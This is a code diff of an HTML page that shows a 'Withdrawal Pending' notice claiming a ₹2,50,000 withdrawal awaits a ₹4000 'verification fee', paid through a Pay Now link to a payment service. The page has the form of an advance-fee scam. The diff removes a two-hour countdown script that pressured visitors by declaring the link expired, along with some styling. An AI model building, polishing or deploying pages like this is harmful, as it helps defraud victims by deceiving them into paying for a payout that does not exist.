@@ -12,7 +12,6 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
     .container {
       background-color: #fff;
@@ -23,12 +22,10 @@
     }
     h1 {
       color: #333;
-      margin-bottom: 10px;
     }
     p {
       font-size: 18px;
       color: #555;
-      margin-bottom: 10px;
     }
     .btn {
       margin-top: 20px;
@@ -45,45 +42,13 @@
     .btn:hover {
       background-color: #218838;
     }
-    #timer {
-      font-size: 16px;
-      color: #ff0000;
-      margin-top: 10px;
-    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1 id="heading">Withdrawal Pending</h1>
-    <p id="message">To process your withdrawal request of ₹2,50,000, please complete the verification fee of ₹4000.</p>
-    <div id="timer"></div>
-    <a class="btn" id="payButton" href="https://payments.cashfree.com/links?code=R8f4ueunbo20" target="_blank">Pay Now</a>
+    <h1>Withdrawal Pending</h1>
+    <p>To process your withdrawal request of ₹2,50,000, please complete the verification fee of ₹4000.</p>
+    <a class="btn" href="https://payments.cashfree.com/links?code=R8f4ueunbo20" target="_blank">Pay Now</a>
   </div>
-
-  <script>
-    // 2 hours countdown
-    var totalSeconds = 2 * 60 * 60; // 7200 seconds
-
-    var timerInterval = setInterval(function() {
-      var hours = Math.floor(totalSeconds / 3600);
-      var minutes = Math.floor((totalSeconds % 3600) / 60);
-      var seconds = totalSeconds % 60;
-
-      // Format the time
-      var timeString = hours + "h " + minutes + "m " + seconds + "s remaining";
-      document.getElementById("timer").innerText = timeString;
-
-      totalSeconds--;
-
-      // Jab timer zero ya neeche aaye
-      if (totalSeconds < 0) {
-        clearInterval(timerInterval);
-        document.getElementById('heading').innerText = "Link Expired";
-        document.getElementById('message').innerText = "The payment link has expired. Please contact support.";
-        document.getElementById('payButton').style.display = "none";
-        document.getElementById('timer').style.display = "none";
-      }
-    }, 1000);
-  </script>
 </body>
 </html>
